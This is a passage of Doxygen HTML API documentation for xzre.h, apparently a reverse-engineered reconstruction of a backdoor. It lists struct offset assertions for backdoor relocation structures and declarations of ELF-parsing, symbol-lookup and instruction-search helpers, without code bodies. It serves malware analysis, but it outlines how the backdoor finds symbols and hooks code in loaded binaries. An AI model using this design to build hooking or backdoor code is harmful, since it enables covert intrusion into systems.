&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structkey__ctx.html">key_ctx_t</a>, args, 0x10)</td></tr>
<tr class="separator:a1c5b1c41fec212ccd3b23bf8976e8eb1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a667cb717343a98ce25a91c16911da1dc"><td class="memItemLeft" align="right" valign="top"><a id="a667cb717343a98ce25a91c16911da1dc"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structkey__ctx.html">key_ctx_t</a>, payload, 0x15)</td></tr>
<tr class="separator:a667cb717343a98ce25a91c16911da1dc"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac0e0e270f39e3bbb6ea6aca1ec2ef5b3"><td class="memItemLeft" align="right" valign="top"><a id="ac0e0e270f39e3bbb6ea6aca1ec2ef5b3"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__cpuid__reloc__consts.html">backdoor_cpuid_reloc_consts_t</a>, cpuid_random_symbol_got_offset, 0)</td></tr>
<tr class="separator:ac0e0e270f39e3bbb6ea6aca1ec2ef5b3"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2722de50727bad809faaa9434ff0057c"><td class="memItemLeft" align="right" valign="top"><a id="a2722de50727bad809faaa9434ff0057c"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__cpuid__reloc__consts.html">backdoor_cpuid_reloc_consts_t</a>, cpuid_got_index, 0x8)</td></tr>
<tr class="separator:a2722de50727bad809faaa9434ff0057c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aff72cca79305fdddb7b9e4c9220435b1"><td class="memItemLeft" align="right" valign="top"><a id="aff72cca79305fdddb7b9e4c9220435b1"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__cpuid__reloc__consts.html">backdoor_cpuid_reloc_consts_t</a>, backdoor_init_stage2_got_offset, 0x10)</td></tr>
<tr class="separator:aff72cca79305fdddb7b9e4c9220435b1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa6f70bf34b2ca798ff98804347584dc9"><td class="memItemLeft" align="right" valign="top"><a id="aa6f70bf34b2ca798ff98804347584dc9"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__tls__get__addr__reloc__consts.html">backdoor_tls_get_addr_reloc_consts_t</a>, tls_get_addr_plt_offset, 0)</td></tr>
<tr class="separator:aa6f70bf34b2ca798ff98804347584dc9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:afa52c8b137a12acb824f5dad8c6ea6bc"><td class="memItemLeft" align="right" valign="top"><a id="afa52c8b137a12acb824f5dad8c6ea6bc"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__tls__get__addr__reloc__consts.html">backdoor_tls_get_addr_reloc_consts_t</a>, tls_get_addr_random_symbol_got_offset, 0x8)</td></tr>
<tr class="separator:afa52c8b137a12acb824f5dad8c6ea6bc"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9e8f0d09d060769a4859a75243017c11"><td class="memItemLeft" align="right" valign="top"><a id="a9e8f0d09d060769a4859a75243017c11"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__functions.html">elf_functions_t</a>, <a class="el" href="xzre_8h.html#abbcfd61778019372e0cabdf79b98824d">init_hook_functions</a>, 0x8)</td></tr>
<tr class="separator:a9e8f0d09d060769a4859a75243017c11"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3aedc50c8768464ec6ed16cc394f0ab1"><td class="memItemLeft" align="right" valign="top"><a id="a3aedc50c8768464ec6ed16cc394f0ab1"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__functions.html">elf_functions_t</a>, <a class="el" href="xzre_8h.html#a099c6531c0b9aaf2a3caf6b001fa5109">elf_symbol_get_addr</a>, 0x20)</td></tr>
<tr class="separator:a3aedc50c8768464ec6ed16cc394f0ab1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aefafdfd3500cfe18ff932b28f0e6b218"><td class="memItemLeft" align="right" valign="top"><a id="aefafdfd3500cfe18ff932b28f0e6b218"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__functions.html">elf_functions_t</a>, <a class="el" href="xzre_8h.html#a049328971f4e99ce954d5e0346fee6d7">elf_parse</a>, 0x30)</td></tr>
<tr class="separator:aefafdfd3500cfe18ff932b28f0e6b218"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a52e1f932fcefc9dba0d744c404a5a031"><td class="memItemLeft" align="right" valign="top"><a id="a52e1f932fcefc9dba0d744c404a5a031"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structfake__lzma__allocator.html">fake_lzma_allocator_t</a>, allocator.alloc, 0x8)</td></tr>
<tr class="separator:a52e1f932fcefc9dba0d744c404a5a031"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a174cc5d1304b26c086e4550b05fa7cd6"><td class="memItemLeft" align="right" valign="top"><a id="a174cc5d1304b26c086e4550b05fa7cd6"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structfake__lzma__allocator.html">fake_lzma_allocator_t</a>, allocator.free, 0x10)</td></tr>
<tr class="separator:a174cc5d1304b26c086e4550b05fa7cd6"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4c458908da84133d84c0eead58c1797f"><td class="memItemLeft" align="right" valign="top"><a id="a4c458908da84133d84c0eead58c1797f"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structfake__lzma__allocator.html">fake_lzma_allocator_t</a>, allocator.opaque, 0x18)</td></tr>
<tr class="separator:a4c458908da84133d84c0eead58c1797f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:abd58a889b4860fcf419275ae124e8de6"><td class="memItemLeft" align="right" valign="top"><a id="abd58a889b4860fcf419275ae124e8de6"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structinstruction__search__ctx.html">instruction_search_ctx_t</a>, start_addr, 0)</td></tr>
<tr class="separator:abd58a889b4860fcf419275ae124e8de6"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab016be09a93fcb7db40cd0744c63759c"><td class="memItemLeft" align="right" valign="top"><a id="ab016be09a93fcb7db40cd0744c63759c"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structinstruction__search__ctx.html">instruction_search_ctx_t</a>, end_addr, 0x8)</td></tr>
<tr class="separator:ab016be09a93fcb7db40cd0744c63759c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aba8cfbc7405ff8c0a18a5bd6707d9705"><td class="memItemLeft" align="right" valign="top"><a id="aba8cfbc7405ff8c0a18a5bd6707d9705"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structinstruction__search__ctx.html">instruction_search_ctx_t</a>, offset_to_match, 0x10)</td></tr>
<tr class="separator:aba8cfbc7405ff8c0a18a5bd6707d9705"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8dc020af30e1b8c031bd2ab82b77a8d2"><td class="memItemLeft" align="right" valign="top"><a id="a8dc020af30e1b8c031bd2ab82b77a8d2"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structinstruction__search__ctx.html">instruction_search_ctx_t</a>, output_register_to_match, 0x18)</td></tr>
<tr class="separator:a8dc020af30e1b8c031bd2ab82b77a8d2"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a902574f56850c3f1dfdc0dfdcc676716"><td class="memItemLeft" align="right" valign="top"><a id="a902574f56850c3f1dfdc0dfdcc676716"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structinstruction__search__ctx.html">instruction_search_ctx_t</a>, output_register, 0x20)</td></tr>
<tr class="separator:a902574f56850c3f1dfdc0dfdcc676716"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a68028c156f6f6901da995916996fe089"><td class="memItemLeft" align="right" valign="top"><a id="a68028c156f6f6901da995916996fe089"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structinstruction__search__ctx.html">instruction_search_ctx_t</a>, result, 0x28)</td></tr>
<tr class="separator:a68028c156f6f6901da995916996fe089"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a508d061d3b0f29eab0ac170f9197ed8f"><td class="memItemLeft" align="right" valign="top"><a id="a508d061d3b0f29eab0ac170f9197ed8f"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structinstruction__search__ctx.html">instruction_search_ctx_t</a>, hooks, 0x30)</td></tr>
<tr class="separator:a508d061d3b0f29eab0ac170f9197ed8f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4bcac3889c4d2fff6294722e35ec4c09"><td class="memItemLeft" align="right" valign="top"><a id="a4bcac3889c4d2fff6294722e35ec4c09"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structinstruction__search__ctx.html">instruction_search_ctx_t</a>, <a class="el" href="structimported__funcs.html">imported_funcs</a>, 0x38)</td></tr>
<tr class="separator:a4bcac3889c4d2fff6294722e35ec4c09"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a52d510f0bbb31de19d8d20bf1acaeb5f"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a52d510f0bbb31de19d8d20bf1acaeb5f">x86_dasm</a> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *ctx, u8 *code_start, u8 *code_end)</td></tr>
<tr class="memdesc:a52d510f0bbb31de19d8d20bf1acaeb5f"><td class="mdescLeft">&#160;</td><td class="mdescRight">disassembles the given x64 code  <a href="xzre_8h.html#a52d510f0bbb31de19d8d20bf1acaeb5f">More...</a><br /></td></tr>
<tr class="separator:a52d510f0bbb31de19d8d20bf1acaeb5f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a41fada894916f4c67d59090ff57aead1"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a41fada894916f4c67d59090ff57aead1">find_call_instruction</a> (u8 *code_start, u8 *code_end, u8 *call_target, <a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *dctx)</td></tr>
<tr class="memdesc:a41fada894916f4c67d59090ff57aead1"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds a call instruction  <a href="xzre_8h.html#a41fada894916f4c67d59090ff57aead1">More...</a><br /></td></tr>
<tr class="separator:a41fada894916f4c67d59090ff57aead1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aea85a14166f11bb956c7862c2a66571e"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aea85a14166f11bb956c7862c2a66571e">find_lea_instruction</a> (u8 *code_start, u8 *code_end, u64 displacement)</td></tr>
<tr class="memdesc:aea85a14166f11bb956c7862c2a66571e"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds a lea instruction  <a href="xzre_8h.html#aea85a14166f11bb956c7862c2a66571e">More...</a><br /></td></tr>
<tr class="separator:aea85a14166f11bb956c7862c2a66571e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a60c226501adb1a2d3213484f651ff23b"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a60c226501adb1a2d3213484f651ff23b">find_instruction_with_mem_operand</a> (u8 *code_start, u8 *code_end, <a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *dctx, void *mem_address)</td></tr>
<tr class="memdesc:a60c226501adb1a2d3213484f651ff23b"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds a LEA or MOV instruction with an immediate memory operand  <a href="xzre_8h.html#a60c226501adb1a2d3213484f651ff23b">More...</a><br /></td></tr>
<tr class="separator:a60c226501adb1a2d3213484f651ff23b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6e76946a37fb256974942a542373e421"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a6e76946a37fb256974942a542373e421">find_lea_instruction_with_mem_operand</a> (u8 *code_start, u8 *code_end, <a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *dctx, void *mem_address)</td></tr>
<tr class="memdesc:a6e76946a37fb256974942a542373e421"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds a LEA instruction with an immediate memory operand  <a href="xzre_8h.html#a6e76946a37fb256974942a542373e421">More...</a><br /></td></tr>
<tr class="separator:a6e76946a37fb256974942a542373e421"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae9718452d28f67f46d046c02c0125148"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ae9718452d28f67f46d046c02c0125148">find_mov_lea_instruction</a> (u8 *code_start, u8 *code_end, BOOL is_64bit_operand, BOOL load_flag, <a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *dctx)</td></tr>
<tr class="memdesc:ae9718452d28f67f46d046c02c0125148"><td class="mdescLeft">&#160;</td><td class="mdescRight">like <a class="el" href="xzre_8h.html#a3ab8cd040932beaf3ec377a753bfece0">find_mov_instruction</a>, but also considers LEA instructions  <a href="xzre_8h.html#ae9718452d28f67f46d046c02c0125148">More...</a><br /></td></tr>
<tr class="separator:ae9718452d28f67f46d046c02c0125148"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3ab8cd040932beaf3ec377a753bfece0"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a3ab8cd040932beaf3ec377a753bfece0">find_mov_instruction</a> (u8 *code_start, u8 *code_end, BOOL is_64bit_operand, BOOL load_flag, <a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *dctx)</td></tr>
<tr class="memdesc:a3ab8cd040932beaf3ec377a753bfece0"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds a MOV instruction.  <a href="xzre_8h.html#a3ab8cd040932beaf3ec377a753bfece0">More...</a><br /></td></tr>
<tr class="separator:a3ab8cd040932beaf3ec377a753bfece0"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1c8a36d89bf4e57077a56611e9aeb470"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a1c8a36d89bf4e57077a56611e9aeb470">find_instruction_with_mem_operand_ex</a> (u8 *code_start, u8 *code_end, <a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *dctx, int opcode, void *mem_address)</td></tr>
<tr class="memdesc:a1c8a36d89bf4e57077a56611e9aeb470"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds an instruction with an immediate memory operand  <a href="xzre_8h.html#a1c8a36d89bf4e57077a56611e9aeb470">More...</a><br /></td></tr>
<tr class="separator:a1c8a36d89bf4e57077a56611e9aeb470"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a544d2cf67930e0fcd9f9ff37239a4c70"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a544d2cf67930e0fcd9f9ff37239a4c70">is_endbr64_instruction</a> (u8 *code_start, u8 *code_end, u32 low_mask_part)</td></tr>
<tr class="memdesc:a544d2cf67930e0fcd9f9ff37239a4c70"><td class="mdescLeft">&#160;</td><td class="mdescRight">Checks if the code between <code>code_start</code> and <code>code_end</code> is an endbr64 instruction.  <a href="xzre_8h.html#a544d2cf67930e0fcd9f9ff37239a4c70">More...</a><br /></td></tr>
<tr class="separator:a544d2cf67930e0fcd9f9ff37239a4c70"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a78aba1d370c6519777e637f1ed7b7c14"><td class="memItemLeft" align="right" valign="top">u8 *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a78aba1d370c6519777e637f1ed7b7c14">find_string_reference</a> (u8 *code_start, u8 *code_end, const char *str)</td></tr>
<tr class="memdesc:a78aba1d370c6519777e637f1ed7b7c14"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds an instruction that references the given string  <a href="xzre_8h.html#a78aba1d370c6519777e637f1ed7b7c14">More...</a><br /></td></tr>
<tr class="separator:a78aba1d370c6519777e637f1ed7b7c14"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6ac7b2035eee3a9ffcceee0f9290c2e1"><td class="memItemLeft" align="right" valign="top">u8 *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a6ac7b2035eee3a9ffcceee0f9290c2e1">elf_find_string_reference</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, EncodedStringId encoded_string_id, u8 *code_start, u8 *code_end)</td></tr>
<tr class="memdesc:a6ac7b2035eee3a9ffcceee0f9290c2e1"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds an instruction that references the given string  <a href="xzre_8h.html#a6ac7b2035eee3a9ffcceee0f9290c2e1">More...</a><br /></td></tr>
<tr class="separator:a6ac7b2035eee3a9ffcceee0f9290c2e1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aed0391d07e4413f5a13e1ec2940c94ea"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aed0391d07e4413f5a13e1ec2940c94ea">find_reg2reg_instruction</a> (u8 *code_start, u8 *code_end, <a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *dctx)</td></tr>
<tr class="memdesc:aed0391d07e4413f5a13e1ec2940c94ea"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds a reg2reg instruction  <a href="xzre_8h.html#aed0391d07e4413f5a13e1ec2940c94ea">More...</a><br /></td></tr>
<tr class="separator:aed0391d07e4413f5a13e1ec2940c94ea"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a81a6f3d01ea6057c942052321b92c533"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a81a6f3d01ea6057c942052321b92c533">find_function_prologue</a> (u8 *code_start, u8 *code_end, u8 **output, FuncFindType find_mode)</td></tr>
<tr class="memdesc:a81a6f3d01ea6057c942052321b92c533"><td class="mdescLeft">&#160;</td><td class="mdescRight">locates the function prologue  <a href="xzre_8h.html#a81a6f3d01ea6057c942052321b92c533">More...</a><br /></td></tr>
<tr class="separator:a81a6f3d01ea6057c942052321b92c533"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:adb94193174339f9eae22428308d46c33"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#adb94193174339f9eae22428308d46c33">find_function</a> (u8 *code_start, void **func_start, void **func_end, u8 *search_base, u8 *code_end, FuncFindType find_mode)</td></tr>
<tr class="memdesc:adb94193174339f9eae22428308d46c33"><td class="mdescLeft">&#160;</td><td class="mdescRight">locates the function boundaries.  <a href="xzre_8h.html#adb94193174339f9eae22428308d46c33">More...</a><br /></td></tr>
<tr class="separator:adb94193174339f9eae22428308d46c33"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2a09d15b1c506e0f29ee9433771ad8db"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a2a09d15b1c506e0f29ee9433771ad8db">elf_contains_vaddr</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, u64 vaddr, u64 size, u32 p_flags)</td></tr>
<tr class="memdesc:a2a09d15b1c506e0f29ee9433771ad8db"><td class="mdescLeft">&#160;</td><td class="mdescRight">checks if given ELF file contains the range [vaddr, vaddr+size) in a segment with the specified memory protection flags  <a href="xzre_8h.html#a2a09d15b1c506e0f29ee9433771ad8db">More...</a><br /></td></tr>
<tr class="separator:a2a09d15b1c506e0f29ee9433771ad8db"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a049328971f4e99ce954d5e0346fee6d7"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a049328971f4e99ce954d5e0346fee6d7">elf_parse</a> (Elf64_Ehdr *ehdr, <a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>)</td></tr>
<tr class="memdesc:a049328971f4e99ce954d5e0346fee6d7"><td class="mdescLeft">&#160;</td><td class="mdescRight">Parses the given in-memory ELF file into <a class="el" href="structelf__info.html">elf_info</a>.  <a href="xzre_8h.html#a049328971f4e99ce954d5e0346fee6d7">More...</a><br /></td></tr>
<tr class="separator:a049328971f4e99ce954d5e0346fee6d7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a642ed90d3ade30228b3286310de5e5c1"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a642ed90d3ade30228b3286310de5e5c1">main_elf_parse</a> (<a class="el" href="structmain__elf.html">main_elf_t</a> *<a class="el" href="structmain__elf.html">main_elf</a>)</td></tr>
<tr class="memdesc:a642ed90d3ade30228b3286310de5e5c1"><td class="mdescLeft">&#160;</td><td class="mdescRight">Parses the main executable from the provided structure. As part of the process the arguments and environment is checked.  <a href="xzre_8h.html#a642ed90d3ade30228b3286310de5e5c1">More...</a><br /></td></tr>
<tr class="separator:a642ed90d3ade30228b3286310de5e5c1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aeba34776520881226359e3a0524fbe7b"><td class="memItemLeft" align="right" valign="top"><a id="aeba34776520881226359e3a0524fbe7b"></a>
char *&#160;</td><td class="memItemRight" valign="bottom"><b>check_argument</b> (char arg_first_char, char *arg_name)</td></tr>
<tr class="separator:aeba34776520881226359e3a0524fbe7b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6925f05854b05bb9441f71c3f1deb55c"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a6925f05854b05bb9441f71c3f1deb55c">elf_find_string_references</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, <a class="el" href="structstring__references.html">string_references_t</a> *refs)</td></tr>
<tr class="memdesc:a6925f05854b05bb9441f71c3f1deb55c"><td class="mdescLeft">&#160;</td><td class="mdescRight">parses the ELF rodata section, looking for strings and the instructions that reference them  <a href="xzre_8h.html#a6925f05854b05bb9441f71c3f1deb55c">More...</a><br /></td></tr>
<tr class="separator:a6925f05854b05bb9441f71c3f1deb55c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9d2747f12c29ef6eae1cc4b09f3cc5f7"><td class="memItemLeft" align="right" valign="top">Elf64_Sym *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a9d2747f12c29ef6eae1cc4b09f3cc5f7">elf_symbol_get</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, EncodedStringId encoded_string_id, EncodedStringId sym_version)</td></tr>
<tr class="memdesc:a9d2747f12c29ef6eae1cc4b09f3cc5f7"><td class="mdescLeft">&#160;</td><td class="mdescRight">Looks up an ELF symbol from a parsed ELF.  <a href="xzre_8h.html#a9d2747f12c29ef6eae1cc4b09f3cc5f7">More...</a><br /></td></tr>
<tr class="separator:a9d2747f12c29ef6eae1cc4b09f3cc5f7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a099c6531c0b9aaf2a3caf6b001fa5109"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a099c6531c0b9aaf2a3caf6b001fa5109">elf_symbol_get_addr</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, EncodedStringId encoded_string_id)</td></tr>
<tr class="memdesc:a099c6531c0b9aaf2a3caf6b001fa5109"><td class="mdescLeft">&#160;</td><td class="mdescRight">Looks up an ELF symbol from a parsed ELF, and returns its memory address.  <a href="xzre_8h.html#a099c6531c0b9aaf2a3caf6b001fa5109">More...</a><br /></td></tr>
<tr class="separator:a099c6531c0b9aaf2a3caf6b001fa5109"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a18845fc4614f60083817db417dc32a13"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a18845fc4614f60083817db417dc32a13">elf_get_code_segment</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, u64 *pSize)</td></tr>
<tr class="memdesc:a18845fc4614f60083817db417dc32a13"><td class="mdescLeft">&#160;</td><td class="mdescRight">Obtains the address and size of the first executable segment in the given ELF file.  <a href="xzre_8h.html#a18845fc4614f60083817db417dc32a13">More...</a><br /></td></tr>
<tr class="separator:a18845fc4614f60083817db417dc32a13"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a55e085fd878446cf655c657491b9d522"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a55e085fd878446cf655c657491b9d522">elf_get_rodata_segment</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, u64 *pSize)</td></tr>
<tr class="memdesc:a55e085fd878446cf655c657491b9d522"><td class="mdescLeft">&#160;</td><td class="mdescRight">Obtains the address and size of the last readonly segment in the given ELF file this corresponds to the segment that typically contains .rodata.  <a href="xzre_8h.html#a55e085fd878446cf655c657491b9d522">More...</a><br /></td></tr>
<tr class="separator:a55e085fd878446cf655c657491b9d522"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a52148c8b1da2a37036e7975ea299117b"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a52148c8b1da2a37036e7975ea299117b">elf_get_data_segment</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, u64 *pSize, BOOL get_alignment)</td></tr>
<tr class="memdesc:a52148c8b1da2a37036e7975ea299117b"><td class="mdescLeft">&#160;</td><td class="mdescRight">Obtains the address and size of the last read-write segment in the given ELF file this is typically the segment that contains the following sections:  <a href="xzre_8h.html#a52148c8b1da2a37036e7975ea299117b">More...</a><br /></td></tr>
<tr class="separator:a52148c8b1da2a37036e7975ea299117b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae691cee2f2e9ea1a5861e3676fac58c0"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ae691cee2f2e9ea1a5861e3676fac58c0">elf_get_reloc_symbol</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, Elf64_Rela *relocs, unsigned num_relocs, unsigned reloc_type, EncodedStringId encoded_string_id)</td></tr>
<tr class="memdesc:ae691cee2f2e9ea1a5861e3676fac58c0"><td class="mdescLeft">&#160;</td><td class="mdescRight">Searches the ELF relocations for a symbol having name <code>encoded_string</code> id and relocation of type <code>reloc_type</code>.  <a href="xzre_8h.html#ae691cee2f2e9ea1a5861e3676fac58c0">More...</a><br /></td></tr>
<tr class="separator:ae691cee2f2e9ea1a5861e3676fac58c0"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acbe9201dea64d4ae8112803f8af95985"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#acbe9201dea64d4ae8112803f8af95985">elf_get_plt_symbol</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, EncodedStringId encoded_string_id)</td></tr>
<tr class="memdesc:acbe9201dea64d4ae8112803f8af95985"><td class="mdescLeft">&#160;</td><td class="mdescRight">Gets the PLT symbol with name <code>encoded_string_id</code> from the parsed ELF file.  <a href="xzre_8h.html#acbe9201dea64d4ae8112803f8af95985">More...</a><br /></td></tr>
<tr class="separator:acbe9201dea64d4ae8112803f8af95985"><td class="memSeparator" colspan="2">&#160;</td></tr>
